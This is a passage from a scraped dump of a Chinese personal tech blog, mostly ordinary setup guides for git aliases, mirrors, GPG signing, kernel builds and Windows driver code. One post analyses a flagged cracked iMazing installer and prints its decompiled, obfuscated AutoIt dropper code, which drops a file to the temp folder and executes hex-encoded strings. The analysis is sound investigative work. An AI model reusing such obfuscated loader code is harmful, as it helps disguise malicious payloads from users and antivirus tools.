--continue\u0026#39; alias grbd=\u0026#39;git rebase $(git_develop_branch)\u0026#39; alias grbi=\u0026#39;git rebase -i\u0026#39; alias grbm=\u0026#39;git rebase $(git_main_branch)\u0026#39; alias grbom=\u0026#39;git rebase origin/$(git_main_branch)\u0026#39; alias grbo=\u0026#39;git rebase --onto\u0026#39; alias grbs=\u0026#39;git rebase --skip\u0026#39; alias grev=\u0026#39;git revert\u0026#39; alias grh=\u0026#39;git reset\u0026#39; alias grhh=\u0026#39;git reset --hard\u0026#39; alias groh=\u0026#39;git reset origin/$(git_current_branch) --hard\u0026#39; alias grm=\u0026#39;git rm\u0026#39; alias grmc=\u0026#39;git rm --cached\u0026#39; alias grmv=\u0026#39;git remote rename\u0026#39; alias grrm=\u0026#39;git remote remove\u0026#39; alias grs=\u0026#39;git restore\u0026#39; alias grset=\u0026#39;git remote set-url\u0026#39; alias grss=\u0026#39;git restore --source\u0026#39; alias grst=\u0026#39;git restore --staged\u0026#39; alias grt=\u0026#39;cd \u0026#34;$(git rev-parse --show-toplevel || echo .)\u0026#34;\u0026#39; alias gru=\u0026#39;git reset --\u0026#39; alias grup=\u0026#39;git remote update\u0026#39; alias grv=\u0026#39;git remote -v\u0026#39; alias gsb=\u0026#39;git status -sb\u0026#39; alias gsd=\u0026#39;git svn dcommit\u0026#39; alias gsh=\u0026#39;git show\u0026#39; alias gsi=\u0026#39;git submodule init\u0026#39; alias gsps=\u0026#39;git show --pretty=short --show-signature\u0026#39; alias gsr=\u0026#39;git svn rebase\u0026#39; alias gss=\u0026#39;git status -s\u0026#39; alias gst=\u0026#39;git status\u0026#39; # use the default stash push on git 2.13 and newer is-at-least 2.13 \u0026#34;$git_version\u0026#34; \\ \u0026amp;\u0026amp; alias gsta=\u0026#39;git stash push\u0026#39; \\ || alias gsta=\u0026#39;git stash save\u0026#39; alias gstaa=\u0026#39;git stash apply\u0026#39; alias gstc=\u0026#39;git stash clear\u0026#39; alias gstd=\u0026#39;git stash drop\u0026#39; alias gstl=\u0026#39;git stash list\u0026#39; alias gstp=\u0026#39;git stash pop\u0026#39; alias gsts=\u0026#39;git stash show --text\u0026#39; alias gstu=\u0026#39;gsta --include-untracked\u0026#39; alias gstall=\u0026#39;git stash --all\u0026#39; alias gsu=\u0026#39;git submodule update\u0026#39; alias gsw=\u0026#39;git switch\u0026#39; alias gswc=\u0026#39;git switch -c\u0026#39; alias gswm=\u0026#39;git switch $(git_main_branch)\u0026#39; alias gswd=\u0026#39;git switch $(git_develop_branch)\u0026#39; alias gts=\u0026#39;git tag -s\u0026#39; alias gtv=\u0026#39;git tag | sort -V\u0026#39; alias gtl=\u0026#39;gtl(){ git tag --sort=-v:refname -n -l \u0026#34;${1}*\u0026#34; }; noglob gtl\u0026#39; alias gunignore=\u0026#39;git update-index --no-assume-unchanged\u0026#39; alias gunwip=\u0026#39;git log -n 1 | grep -q -c \u0026#34;\\-\\-wip\\-\\-\u0026#34; \u0026amp;\u0026amp; git reset HEAD~1\u0026#39; alias gup=\u0026#39;git pull --rebase\u0026#39; alias gupv=\u0026#39;git pull --rebase -v\u0026#39; alias gupa=\u0026#39;git pull --rebase --autostash\u0026#39; alias gupav=\u0026#39;git pull --rebase --autostash -v\u0026#39; alias glum=\u0026#39;git pull upstream $(git_main_branch)\u0026#39; alias gwch=\u0026#39;git whatchanged -p --abbrev-commit --pretty=medium\u0026#39; alias gwip=\u0026#39;git add -A; git rm $(git ls-files --deleted) 2\u0026gt; /dev/null; git commit --no-verify --no-gpg-sign -m \u0026#34;--wip-- [skip ci]\u0026#34;\u0026#39; alias gam=\u0026#39;git am\u0026#39; alias gamc=\u0026#39;git am --continue\u0026#39; alias gams=\u0026#39;git am --skip\u0026#39; alias gama=\u0026#39;git am --abort\u0026#39; alias gamscp=\u0026#39;git am --show-current-patch\u0026#39; ","date":"2022-04-26T21:26:01+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/ohmyzsh%E4%B8%AD%E7%9A%84git%E5%91%BD%E4%BB%A4%E7%BC%A9%E5%86%99/","title":"OhMyZsh中的Git命令缩写"},{"content":"本文来源：Moeomu的博客\n问题再现 可重现：是 主机系统：macOS BigSur 11.6 虚拟机系统：Ubuntu Desktop 20.04.3 Parallels虚拟机版本：17.0.1 问题描述：虚拟机系统在安装或者运行基于NodeJS尤其是Electron的应用后，应用会出现占据1/4的白色屏幕且3/4黑屏的异常显示情况，无法正常使用 故障典型应用： VSCode Motrix Typora 解决方案 方案一 给每一个Electron应用添加启动时参数--disable-gpu\n补充：可以在桌面建立一个快捷方式实现，以vscode为例，内容如下\ncode.desktop\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [Desktop Entry] Name=Visual Studio Code Comment=Code Editing. Redefined. GenericName=Text Editor Exec=/usr/share/code/code --disable-gpu --unity-launch %F Icon=com.visualstudio.code Type=Application StartupNotify=false StartupWMClass=Code Categories=Utility;TextEditor;Development;IDE; MimeType=text/plain;inode/directory;application/x-code-workspace; Actions=new-empty-window; Keywords=vscode; X-Desktop-File-Install-Version=0.24 [Desktop Action new-empty-window] Name=New Empty Window Exec=/usr/share/code/code --disable-gpu --new-window %F Icon=com.visualstudio.code 方案二 关闭Parallels/其他虚拟化软件-此虚拟机的图形-硬件加速功能，如下图所示\n其他信息 Electron的官方开发人员在Github上提到\nYou can probably disable GPU acceleration to work around this, or just use another visual machine software. Basically the GPU acceleration of Linux in virtual machines is a mess, depending on the software of visual machine, the version and distribution of Linux, and the version of Chromium, you can get various results and bugs.\nLinux的虚拟机硬件加速一团糟，因此出现这个情况是正常的 ","date":"2021-10-12T19:22:01+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%8A%A0%E9%80%9F%E5%AF%BC%E8%87%B4%E7%9A%84electron%E5%BA%94%E7%94%A8%E7%99%BD%E5%B1%8F%E7%9A%84%E9%97%AE%E9%A2%98/","title":"虚拟机硬件加速导致的Electron应用白屏的问题"},{"content":"本文来源：Moeomu的博客\n安装 Debain(Ubuntu, etc.)\n1 2 apt install node apt install yarn macOS\n1 2 brew install node brew install yarn 配置镜像源 设置为淘宝镜像源 1 2 npm config set registry https://registry.npm.taobao.org/ yarn config set registry https://registry.npm.taobao.org/ 重置为官方镜像源 1 2 npm config set registry https://registry.npmjs.org/ yarn config set registry https://registry.yarnpkg.com/ ","date":"2021-09-27T13:56:01+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/nodejs%E9%95%9C%E5%83%8F%E6%BA%90%E9%85%8D%E7%BD%AE/","title":"NodeJS镜像源配置"},{"content":"本文来源：Moeomu的博客\n缘起 想找个爱思助手的备份，找上了iMazing，兴起找到了TNT破解版的iMazing，从此链接下载适用于Windows的iMazing后却发现被Windows11自带的杀毒软件报毒，于是起了想分析这个破解版的兴趣\n分析 1、概览 如图所示，解压后是一个官方安装包以及一个Create__Fix.exe，正是这个文件被报毒，以此展开调查 2、Create__Fix.exe 拖入DIE，看到这个文件似乎是个压缩包，将它解压，内容如图所示 其中有一个Fix.exe以及一个iMazing_fix.bat，但是这个bat打开是乱码，使用C32Asm来看一下十六进制格式内容，如图所示 这不是看的很清楚嘛，这个iMazing_fix.bat的运行流程如下 第一步，运行Fix.exe，参数是pt147147和-d%dir%，这个写法让我感觉这是个压缩文件了，貌似还真是 第二步，等待一秒 第三步，删除Fix.exe和iMazing_fix.bat 我不禁好奇，是什么原因让它向千层饼看齐，一层又一层没完没了 如图所示，不出意料它又是一个RAR压缩文件 3、Fix.exe 解压缩，需要密码，我猜密码是t147147，哦猜对了，TNT团队并没有定制自己的解压工具，用WinRAR的sfx自解压模块传参解压，解压后如图所示 解压后的文件分为三个，bat脚本依旧是被加密的状态，再次使用十六进制编辑器阅读它 经过DIE分析，data.bin是个可执行程序，将它重命名为data.exe 经过DIE分析，v1是个二进制文件，暂时无法识别 4、Created_By_TNT_Team.bat 如图所示，这个脚本文件做的操作是以下几步 第一步，清理屏幕 第二步，关闭回显 第三步，运行data.bin这个可执行程序，参数是v1 第四步，删除v1、data.bin、Created_By_TNT_Team.bat 4、data.exe和v1 这个data.exe重命名后就十分明了，它是AutoIt3的脚本运行器，那么v1不出所料就是一个AutoIt3的脚本，后缀应该是a3x v1是编译完成的au3脚本，我在GitHub上找到了一些反编译器，例如UnAutoIt 如图所示，解压完毕，从v1中释放出来一个iMazing.exe以及一个脚本，此脚本混淆极其严重，几乎无法阅读 被修改后的iMazing.exe还附带原始的数字签名，尽管它已经失效，看起来它将会本地修改iMazing.exe，应该算是一个文件补丁，但是看起来哈希没什么变化\u0026hellip; 以下是反编译出来的一些有用的代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 Func a2f00001b21_() For $ax0x0xa = 0x1 To 0x5 Local $a2f00001b21sz_ = a2f00001b21x_() FileInstall(\u0026#34;d3c0ef51c80f467bc9002bbf93fcb10d0c917dbaae819ccd925e2f8902d3c9c5229702964c538605098cce34d2e9cc90ce0618992ba26caea18b5b5ccd9dd0acf02370c4bc004868283b8067c8309862\u0026#34; \u0026amp; _ \u0026#34;cf2f70d92252928d02af9b1c7d80c3303522b08f2\u0026#34;, $a2f00001b21sz_, 0x1) Global $a2f00001b21, $os = Execute(BinaryToString(\u0026#34;0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833\u0026#34; \u0026amp; _ \u0026#34;3533333337333433373332333633393336343533363337333533333337333033363433333633393337333433323338333433363336333933363433333633353335333233363335333633313336333433\u0026#34; \u0026amp; _ \u0026#34;3233383332333433343331333333323334333633333330333333303333333033333330333333313334333233333332333333313337333333373431333534363332333933323433333233373337343333\u0026#34; \u0026amp; _ \u0026#34;33333333333338333333373334333933323337333234333333333133323339323732393239272929\u0026#34;)) If IsArray($os) And $os[0x0] \u0026gt;= 0x46da Then ExitLoop Sleep(0xa) Next Execute(BinaryToString(\u0026#34;0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833\u0026#34; \u0026amp; _ \u0026#34;3333313332343233343336333633393336343333363335333433343336333533363433333633353337333433363335333233383332333433343331333333323334333633333330333333303333333033\u0026#34; \u0026amp; _ \u0026#34;3333303333333133343332333333323333333133373333333734313335343633323339323732393239272929\u0026#34;)) EndFunc ; -\u0026gt; a2f00001b21_ Func a2f00001b21x_() Local $a2f00001b21s1_ = a2f00001b21(\u0026#34;4054656D70446972\u0026#34;), $a2f00001b21s3_ = a2f00001b21(\u0026#34;31\u0026#34;), $a2f00001b21s4_ = a2f00001b21(\u0026#34;5c\u0026#34;), $a2f00001b21s5_ = a2f00001b21(\u0026#34;5c\u0026#34;), $a2f00001b21s6_ = a2f00001b21(\u0026#34;37\u0026#34;), $a2f00001b21s8_ = a2f00001b21(\u0026#34;3937\u0026#34;), $a2f00001b21s9_ = a2f00001b21(\u0026#34;313232\u0026#34;), $a2f00001b21s7_ = a2f00001b21(\u0026#34;31\u0026#34;), $a2f00001b21sa_ Local $a2f00001b21s2_ = Execute($a2f00001b21s1_) If StringRight($a2f00001b21s2_, Number($a2f00001b21s3_)) \u0026lt;\u0026gt; $a2f00001b21s4_ Then $a2f00001b21s2_ = $a2f00001b21s2_ \u0026amp; $a2f00001b21s5_ SRandom(Number(StringRight(TimerInit(), 0x4))) Do $a2f00001b21sa_ = \u0026#39;\u0026#39; While StringLen($a2f00001b21sa_) \u0026lt; Number($a2f00001b21s6_) $a2f00001b21sa_ = $a2f00001b21sa_ \u0026amp; Chr(Random(Number($a2f00001b21s8_), Number($a2f00001b21s9_), Number($a2f00001b21s7_))) WEnd $a2f00001b21sa_ = $a2f00001b21s2_ \u0026amp; $a2f00001b21sa_ Until Not FileExists($a2f00001b21sa_) Return ($a2f00001b21sa_) EndFunc ; -\u0026gt; a2f00001b21x_ Func a2f00001b21($a2f00001b21) Local $a2f00001b21_ For $x = 0x1 To StringLen($a2f00001b21) Step 0x2 $a2f00001b21_ \u0026amp;= Chr(Dec(StringMid($a2f00001b21, $x, 0x2))) Next Return $a2f00001b21_ EndFunc ; -\u0026gt; a2f00001b21 结论 它应该什么都没干仅仅只是释放了一个可执行文件，但是这个释放方式实在是令人奇怪 它最后释放的iMazing.exe是并未破解的版本，事情更加奇怪了 ","date":"2021-09-27T13:56:01+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E5%88%86%E6%9E%90imazing_tntcracked/","title":"分析iMazing_TNTCracked"},{"content":"本文来源：Moeomu的博客\n磁铁大法 寻找两块磁铁，放置在 MacBook的音响附近的位置，欺骗系统合盖检测从而实现关闭内置屏幕\nNVRAM启动设置法 此方法从驱动层面实现了将画面单独显示在外接屏幕上\n启用 重新启动，按着Command+R按键不放 输入密码进入启动设置-终端 输入命令nvram boot-args=\u0026quot;niog=1\u0026quot; 连接外接显示器，连接电源，重新启动 启动后输入用户密码立刻合盖，随后看到外接屏有画面，打开MacBook的盖子，成功 还原 重新启动，按着Command+R按键不放 输入密码进入启动设置-终端 输入命令nvram -d boot-args 重新启动 ","date":"2021-09-16T17:00:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/macos%E5%85%B3%E9%97%AD%E5%86%85%E7%BD%AE%E5%B1%8F%E5%B9%95/","title":"macOS关闭内置屏幕"},{"content":"本文来源：Moeomu的博客\n准备环境 Ubuntu 20.04 LTS Linux 4.9.229 Busybox 1.33.0 qemu 下载内核源代码和文件系统源代码 在站点Kernel.org下载linux-4.9.229.tar.gz 在站点Busybox.net下载busybox-1.33.0.tar.bz2 通过apt安装qemu：sudo apt install qemu-system-x86 编译 编译内核 export ARCH=x86 make x86_64_defconfig make menuconfig 选中General Setup -\u0026gt; Initial RAM filesystem and RAM disk(initramfs/initrd) support 选中Device Drivers -\u0026gt; Block devices -\u0026gt; RAM block device support 修改Device Drivers -\u0026gt; Block devices -\u0026gt; RAM block device support -\u0026gt; (65536)default RAM disk size (kbytes) 如果这一步报错fatal error: curses.h，则安装一下sudo apt install libncurses5-dev\nmake\n编译好的内核被放置在目录arch/x86/boot下，文件名bzImage\n编译busybox make menuconfig 选中Settings -\u0026gt; Build Options -\u0026gt; [*] Build Busybox as a static binary (no shard libs) make \u0026amp;\u0026amp; make install 打包文件系统 mkdir etc dev mnt\nmkdir -p proc sys tmp\nmkdir -p etc/init.d\nvim etc/fstab\n1 2 3 proc /proc proc defaults 0 0 tmpfs /tmp tmpfs defaults 0 0 sysfs /sys sysfs defaults 0 0 vim etc/init.d/rcS\n1 2 3 4 5 6 7 8 echo -e \u0026#34;Welcome to Moeomu Linux\u0026#34; /bin/mount -a echo -e \u0026#34;Remounting the root filesystem\u0026#34; mount -o remount rw / mkdir -p /dev/pts moutn -t devpts devpts /dev/pts echo /sbin/mdev \u0026gt; /proc/sys/kernel/hotplug mdev -s chmod 755 etc/init.d/rcS\nvim etc/inittab\n1 2 3 4 ::sysinit:/etc/init.d/rcS ::respawn:-/bin/sh ::askfirst:-/bin/sh ::cttlaltdel:/bin/umount -a -r chmod 755 etc/inittab\ncd dev\nsudo mknod console c 5 1\nsudo mknod null c 1 3\nsudo mknod tty1 c 4 1\n以下代码在busybox源码目录下逐行执行\n1 2 3 4 5 6 7 8 9 10 #!/bin/bash rm -rf rootfs.ext3 sudo rm -rf fs dd if=/dev/zero of=./rootfs.ext3 bs=1M count=32 mkfs.ext3 rootfs.ext3 mkdir fs sudo mount -o loop rootfs.ext3 ./fs sudo cp -rf ./_install/* ./fs sudo umount ./fs gzip --best -c rootfs.ext3 \u0026gt; rootfs.img.gz 最终生成了文件系统：rootfs.img.gz\n使用QEMU运行系统 qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage -initrd ./busybox-1.33.1/rootfs.img.gz -append \u0026quot;root=/dev/ram init=/linuxrc\u0026quot; -serial file:output.txt\n预览如下\n","date":"2021-07-07T11:20:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/linux%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%96%E8%AF%91%E5%92%8C%E5%90%AF%E5%8A%A8%E5%86%85%E6%A0%B8/","title":"Linux内核编程学习笔记-001-编译和启动内核"},{"content":"本文来源：Moeomu的博客\n首先更新kali源 阿里云源如下 1 2 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 报错内容 1 2 3 4 5 6 An error occurred while installing the following packages: - libelf-dev - linux-headers-5.10.0-kali9-amd64 - dkms Install these packages manually and start the Parallels Tools installation again. 解决方案 安装缺失的包 1 2 sudo apt install dkms sudo apt intall libelf-dev 坑点记录：\nKali 2021默认的xfce桌面环境会导致安装ParallelsTools后白屏，所以要事先将桌面环境切换为gnome或者在安装kali的时候就取消选择xface，选中gnome\n","date":"2021-07-06T15:55:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/parallelstools%E9%AB%98%E7%89%88%E6%9C%ACkali%E6%8A%A5%E9%94%99/","title":"ParallelsTools高版本Kali报错"},{"content":"本文来源：Moeomu的博客\n下载GPG4WIN 下载链接：gpg4win\n创建和应用GPG密钥 创建GPG密钥 创建：gpg --full-generate-key 密钥长度：4096 输入用户名、邮箱 列出所有密钥：gpg --list-secret-keys --keyid-format=long 根据keyid导出密钥：gpg --armor --export KEYID 应用密钥 将密钥导入Github和Gitee 配置Git Windows 配置默认用户名和邮箱，需要和创建GPG时设定的值保持一致 git config --global user.name USERNAME git config --global user.email EMAIL 配置密钥 git config --global user.signingKey KEYID 启用全局加密签名 git config --global commit.gpgSign true ","date":"2021-06-05T08:50:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/windows%E4%B8%8B%E4%BD%BF%E7%94%A8gpg%E4%B8%BAgit-commit%E7%AD%BE%E5%90%8D/","title":"Windows下使用GPG为Git Commit签名"},{"content":"本文来源：Moeomu的博客\n关于GitHub GPG密钥验证 开启Commit签名 GitHub有个新的“警惕模式”，启用后GPG密钥需要签名认证的commit才会显示“Verity”，启用方法如下\n首先创建GPG密钥（GitHub官方Docs有详细方法，不再赘述） 列出GPG密钥的特征码：gpg -K --keyid-format LONG，将keyid记录 告知git使用此GPG密钥：git config user.signingkey your_keyid 本地git的用户名和邮箱需要和GPG密钥生成时填入的相同：git config user.name name，git config user.email email 启用本地git的Commit签名：git config commit.gpgsign true Commit签名加入-S选项：git commit -S -m message 发生致命错误-无法Commit-macOS 问题如下，复现于macOS 11.3.1中 1 2 error: gpg failed to sign the data fatal: failed to write commit object macOS中的解决办法 更新\u0026amp;安装 1 2 3 4 5 6 7 8 brew upgrade gnupg # This has a make step which takes a while brew link --overwrite gnupg brew install pinentry-mac echo \u0026#34;pinentry-program /usr/local/bin/pinentry-mac\u0026#34; \u0026gt;\u0026gt; ~/.gnupg/gpg-agent.conf killall gpg-agent git config --global gpg.program gpg # perhaps you had this already? On linux maybe gpg2 git config --global commit.gpgsign true # if you want to sign every commit 再次签名 查看commit状态：git log --show-signature -1 ","date":"2021-05-25T07:55:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/macos%E4%B8%8B%E4%BD%BF%E7%94%A8gpg%E4%B8%BAgit-commit%E7%AD%BE%E5%90%8D/","title":"macOS下使用GPG为Git Commit签名"},{"content":"本文来源：Moeomu的博客\nMention 稍微提及一下，山西校企通的自动打卡项目经过思考之后将它决定将它开源，这只是一段赶工出来的不成熟的代码，因此可能会有些阅读困难，但是使用不会有问题，也已经稳定运行了半年多，Readme中我写了所有的使用方法和注意事项，以下是开源地址\n[Github]-XQT-Auto-Clockin\n特性 全自动打卡 多用户自动打卡（为了防止服务器被封IP设置了延时打卡） 不需要账户密码，只需要身份证号即可 My Way 似乎会经常陷入抑郁状态，似乎越来越难以控制自己，也许应该去医院看看了\n","date":"2021-05-24T10:36:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%97%A5%E8%AE%B0-2021-05-24/","title":"日记-2021-05-24"},{"content":"本文来源：Moeomu的博客\nVSCode-Python-Venv-PowerShell未签名环境无法激活 在Windows下激活VENV虚拟Python环境写代码遇到了PowerShell文件的无法运行的事情，原因是PowerShell脚本文件未签名，百度寻找了一下解决办法却是清一色的让将Windows安全策略改成签名，如下\nset-executionpolicy remotesigned 总觉得不应该这样，这样修改策略实属下策，去谷歌找了一下解决办法，发现这是个2018年的问题，未有良好的解决办法，但是仍旧找到了一份好的策略，即将当前用户的签名策略改成需远程签名，其它用户仍旧是阻挡\nSet-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser 随后可以通过以下代码查看策略修改情况\nGet-ExecutionPolicy -LIST Python更换PIP源 每次都搜索引擎找源太麻烦了，不如直接记个笔记备份到本地为好\nWindows %HOMEPATH%/pip/pip.ini\nLinux \u0026amp; macOS ~/.pip/pip.conf\n编辑格式 1 2 3 4 [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=pypi.tuna.tsinghua.edu.cn pip源 名称 源的地址 清华 https://pypi.tuna.tsinghua.edu.cn/simple 阿里云 http://mirrors.aliyun.com/pypi/simple/ 中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/ 华中理工大学 http://pypi.hustunique.com/ 山东理工大学 http://pypi.sdutlinux.org/ 豆瓣 http://pypi.douban.com/simple/ pip模块未找到错误 python -m ensurepip python -m pip install --upgrade pip ","date":"2021-01-19T17:48:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/windows%E4%B8%8B%E7%94%A8vscode%E7%BC%96%E5%86%99python%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/","title":"Windows下用vscode编写python的问题总结"},{"content":"本文来源：Moeomu的博客\n字符串操作 内核中使用UNICODE_STRING结构来作为基本的字符串结构，应该注意的是使用此结构中的lenth成员确定字符串长度，而不是'\\0'。\n字符串初始化 函数：RtlInitUnicodeString 参数： PUNICODE_STRING: DestinationString PCWSTR: SourceString 返回值：无 IRQL：\u0026lt;=DISPATCH_LEVEL 解释：初始化一个以0结尾的WCHAR字符串，第一个参数是输入参数也是输出参数 1 2 3 UNICODE_STRING uFirstString = {0}; RtlInitUnicodeString(\u0026amp;uFirstString, L\u0026#34;HelloWorld\\n\u0026#34;); DbgPrint(\u0026#34;String:%wZ\u0026#34;, \u0026amp;uFirstString); 坑：它并没有为buffer分配空间，而是直接指向Source首地址，因此要保证Source始终有效，否则就是无效访问\n字符串拷贝 函数：RtlUnicodeStringCopyString 参数： PUNICODE_STRING: DestinationString NTSTRSAFE_PCWSTR: pszSrc 返回值：NTSTAUTS 成功执行返回STATUS_SUCCESS IRQL：=PASSIVE_LEVEL 解释：将src复制一份到dest里面 1 2 3 4 5 WCHAR strBuf[128] = {0}; UNICODE_STRING uFirstString = {0}; RtlInitEmptyUnicodeString(\u0026amp;uFirstString, strBuf, sizeof(strBuf)); RtlUnicodeStringCopyString(\u0026amp;uFirstString, L\u0026#34;Hello Kernel\\n\u0026#34;); DbgPrint(\u0026#34;String: %wZ\u0026#34;, \u0026amp;uFirstString); 坑：为了使用RtlUnicodeStringCopyString函数，应该添加头文件Ntstrsafe.h；不能copy到定长buf的String里，否则会蓝屏报内存读写错误\n链表 链表的定义 以下是wdk中链表的定义\n1 2 3 4 5 typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; // 后节点 struct _LIST_ENTRY *Blink; // 前节点 } LIST_ENTRY, *PLIST_ENTRY; 使用链表 1 2 3 4 5 6 7 8 typedef struct _TestListEntry { ULONG m_ulData1; ULONG m_ulData2; LIST_ENTRY m_ListEntry; ULONG m_ulData3; ULONG m_ulData4; } 一般而言，为了方便操作，会定义一个链表的头结点，不包含任何内容，只是一个LIST_ENTRY结构。 头节点初始化 1 2 LIST_ENTRY ListHeader = {0}; InitializeListHead(\u0026amp;ListHeader); 节点插入 1 2 3 4 5 6 7 8 9 10 11 12 13 LIST_ENTRY ListHeader = {0}; TestListEntry Entry1 = {0}; TestListEntry Entry2 = {0}; TestListEntry Entry3 = {0}; Entry1.m_ulData1 = \u0026#39;A\u0026#39;; Entry2.m_ulData1 = \u0026#39;B\u0026#39;; Entry3.m_ulData1 = \u0026#39;C\u0026#39;; InitializeListHead(\u0026amp;ListHeader); InsertHeadList(\u0026amp;ListHeader, \u0026amp;Entry2.m_ListEntry); InsertHeadList(\u0026amp;ListHeader, \u0026amp;Entry1.m_ListEntry); InsertTailList(\u0026amp;ListHeader, \u0026amp;Entry3.m_ListEntry); 链表遍历 1 2 3 4 5 6 7 8 PLIST_ENTRY pListEntry = NULL; pListEntry = ListHeader.Flink; while(pListEntry != \u0026amp;ListHeader) { PTestListEntry pTestEntry = CONTAINING_RECORD(pListEntry, TestListEntry, m_ListEntry); DbgPrint(\u0026#34;ListPtr=%p, Entry=%p, Tag=%c\\n\u0026#34;, pListEntry, pTestEntry, (CHAR)pTestEntry-\u0026gt;m_ulData1); pListEntry = pListEntry-\u0026gt;Flink; } CONTAINING_RECORD的作用是将m_ListEntry地址转为结构体TestListEntry首地址 CONTAINING_RECORD用法：CONTAINING_RECORD(PCHAR Address, TYPE Type, PCHAR Field) 节点移除 移除首节点：PLIST_ENTRY RemoveHeadList(PLIST_ENTRY ListHead) 移除尾节点：PLIST_ENTRY RemoveTailList(PLIST_ENTRY ListHead) 如果成功，上面两个函数都将返回链首地址，如果无法移除，则返回NULL 移除特定节点： BOOLEAN RemoveEntryList(PLIST_ENTRY Entry) 若移除后变成空链表，那么将返回TRUE，如果非空，则返回FALSE 判断链表状态 BOOLEAN IsListEmpty(const LIST_ENTRY *ListHead) 它返回TRUE时表示为空链表，否则表示链表非空 自旋锁 使用自旋锁 自旋锁是内核提供的一种高IRQL锁，用同步以及独占的方式访问某个资源\n注意事项：\n自旋锁变量不能存放在当前函数栈中，否则每次进入初始化一遍跟不初始化一样 初始化/使用自旋锁 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // Initialize Spin Lock WARN: not local var KSPIN_LOCK my_spin_lock; void initLock() { KeInitializeSpinLock(\u0026amp;my_spin_lock); } void TestFuncLock() { // it\u0026#39;s a safe function // Acquire Lock KIRQL irql; // save old irql // Normal Spin Lock KeAcquireSpinLock(\u0026amp;my_spin_lock, \u0026amp;irql); // TO DO KeReleaseSpinLock(\u0026amp;my_spin_lock, irql); } 自旋锁在双向链表中使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void TestFuncLock() { // it\u0026#39;s a safe function DbgPrint(\u0026#34;[%ws] Enter...\\n\u0026#34;, __FUNCTIONW__); // Acquire Lock KIRQL irql; // save old irql // Normal Spin Lock KeAcquireSpinLock(\u0026amp;my_spin_lock, \u0026amp;irql); // Test List typedef struct _FILE_INFO { LIST_ENTRY m_ListEntry; UNICODE_STRING m_strFileName; }FILE_INFO, *PFILE_INFO; LIST_ENTRY listHead; FILE_INFO my_file_info; RtlInitUnicodeString(\u0026amp;my_file_info.m_strFileName, L\u0026#34;TestName\u0026#34;); InitializeListHead(\u0026amp;listHead); ExInterlockedInsertHeadList(\u0026amp;listHead, \u0026amp;my_file_info.m_ListEntry, \u0026amp;my_spin_lock); KeReleaseSpinLock(\u0026amp;my_spin_lock, irql); } 队列自旋锁 队列自旋锁可以在多CPU平台上有更好的性能，也遵循先等待先获取自旋锁的原则。\n它和普通自旋锁的初始化是一样的，但是初始化后的自旋锁绝不能混用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 KSPIN_LOCK my_spin_lock; void initLock() { KeInitializeSpinLock(\u0026amp;my_spin_lock); } void TestFuncLock() { // it\u0026#39;s a safe function // Acquire Lock KIRQL irql; // save old irql // Queue Spin Lock KLOCK_QUEUE_HANDLE my_lock_queue_handle; KeAcquireInStackQueuedSpinLock(\u0026amp;my_spin_lock, \u0026amp;my_lock_queue_handle); KeReleaseInStackQueuedSpinLock(\u0026amp;my_lock_queue_handle); } 内存分配 常规内存分配 1 2 3 4 5 6 7 8 9 10 11 12 13 void TestFuncMem() { PVOID buffer = ExAllocatePoolWithTag(NonPagedPoolNx, 512, \u0026#39;tag1\u0026#39;); if (buffer) { ExFreePoolWithTag(buffer, \u0026#39;tag1\u0026#39;); DbgPrint(\u0026#34;[%ws] Pool Operate Success!\\n\u0026#34;, __FUNCTIONW__); } else { DbgPrint(\u0026#34;[%ws] Allocate Pool Failed!\\n\u0026#34;, __FUNCTIONW__); } } 快表内存分配 优点：高频率从系统中申请和释放内存，使用快表分配将大大提高性能\n注意：有些地方称为“旁视列表”(LookAside) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 void TestFuncMemLookaside() { PNPAGED_LOOKASIDE_LIST pLookAsideList = NULL; BOOLEAN bSucc = FALSE; BOOLEAN bInit = FALSE; PVOID pFirstMemory = NULL; PVOID pSeocdeMemory = NULL; do { pLookAsideList = (PNPAGED_LOOKASIDE_LIST)ExAllocatePoolWithTag(NonPagedPoolNx, sizeof(NPAGED_LOOKASIDE_LIST), \u0026#39;test\u0026#39;); if (pLookAsideList == NULL) { break; } memset(pLookAsideList, 0, sizeof(NPAGED_LOOKASIDE_LIST)); // init ExInitializeNPagedLookasideList(pLookAsideList, NULL, NULL, 0, 128, \u0026#39;test\u0026#39;, 0); bInit = TRUE; // start allocate 